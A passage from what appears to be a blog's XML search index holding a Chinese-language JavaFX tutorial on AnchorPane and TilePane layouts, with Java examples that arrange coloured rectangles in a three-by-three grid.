class="type">TextArea</span> <span class="variable">ta</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextArea</span>();  </span><br><span class="line">        ap.getChildren().add( ta );  </span><br><span class="line">  </span><br><span class="line">        AnchorPane.setTopAnchor( ta, <span class="number">40.0d</span> );  </span><br><span class="line">        AnchorPane.setBottomAnchor( ta, <span class="number">40.0d</span> );  </span><br><span class="line">        AnchorPane.setRightAnchor( ta, <span class="number">10.0d</span> );  </span><br><span class="line">        AnchorPane.setLeftAnchor( ta, <span class="number">10.0d</span> );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(ap);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;AnchorPaneApp&quot;</span>);  </span><br><span class="line">        primaryStage.setScene( scene );  </span><br><span class="line">        primaryStage.setWidth(<span class="number">568</span>);  </span><br><span class="line">        primaryStage.setHeight(<span class="number">320</span>);  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">  </span><br><span class="line">        ScenicView.show(scene);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
## TilePane 
`TilePane`用于相同大小的单元格的网格布局。 prefColumns和prefcountries属性定义网格中的行数和列数。 要将节点添加到`TilePane`，请访问children属性并调用add（）或addAll（）方法。 这比需要显式设置节点的行/列位置的`GridPane`更容易使用。
此屏幕截图显示了一个定义为3 × 3网格的`TilePane`。 `TilePane`包含9个`Rectangle`对象。
下面是三乘三网格的完整代码。 `TilePane`的children属性提供了addAll（）方法，`Rectangle`对象将添加到该方法中。 tileAlignment属性将每个`Rectangle`对象定位在其对应图块的中心。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreeByThreeApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TilePane</span> <span class="variable">tilePane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TilePane</span>();</span><br><span class="line">        tilePane.setPrefColumns(<span class="number">3</span>);</span><br><span class="line">        tilePane.setPrefRows(<span class="number">3</span>);</span><br><span class="line">        tilePane.setTileAlignment( Pos.CENTER );</span><br><span class="line"></span><br><span class="line">        tilePane.getChildren().addAll(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>(<span class="number">50</span>, <span class="number">50</span>, Color.RED),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>( <span class="number">50</span>, <span class="number">50</span>, Color.GREEN ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>( <span class="number">50</span>, <span class="number">50</span>, Color.BLUE ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>( <span class="number">50</span>, <span class="number">50</span>, Color.YELLOW ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>( <span class="number">50</span>, <span class="number">50</span>, Color.CYAN ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>( <span class="number">50</span>, <span class="number">50</span>, Color.PURPLE ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>( <span class="number">50</span>, <span class="number">50</span>, Color.BROWN ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>( <span class="number">50</span>, <span class="number">50</span>, Color.PINK ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Rectangle</span>( <span class="number">50</span>, <span class="number">50</span>, Color.ORANGE )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(tilePane);</span><br><span class="line">        scene.setFill(Color.LIGHTGRAY);</span><br><span class="line"></span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;3x3&quot;</span>);</span><br><span class="line">        primaryStage.setScene( scene );</span><br><span class="line">        primaryStage.show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;launch(args);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/image/Pasted image 20240501171847.png" alt="20240501171847.png" />
由于`Node`的所有`TilePane`内容都是大小相等的矩形，因此布局被打包在一起，并且tileAlignment设置不明显。 当tilePrefHeight和tilePrefWidth属性被设置为大于内容时—比如100x100个瓷砖包含50x50个矩形—tileAlignment将决定如何使用额外的空间。
请参见以下修改后的ThreeByThreeApp类，它设置了tilePrefHeight和tilePrefWidth。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">tilePane.setPrefTileHeight(<span class="number">100</span>);</span><br><span class="line">tilePane.setPrefTileWidth(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<img src="/image/Pasted image 20240501171957.png" alt="20240501171957.png" />
在前面的屏幕截图中，为3 × 3网格提供了9个Rectangle对象。 如果内容与`TilePane`定义不匹配，则这些单元格将折叠。 这个修改只增加了五个矩形而不是九个。 第一行包含所有三个图块的内容。 第二行仅包含前两个文件的内容。 第三行完全不见了。
<img src="/image/Pasted image 20240501172158.png" alt="20240501172158.png" />
有一个属性“orientation”，指示`TilePane`逐行（HORIZONTAL，默认值）或逐列（VERTICAL）添加项目。 如果使用VERTICAL，那么第一列将有三个元素，第二列将只有前两个元素，第三列将缺失。 这个屏幕截图显示了使用垂直方向将五个矩形添加到三乘三的网格（九个瓷砖）中。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>前端</tag>
      </tags>
  </entry>
</search>
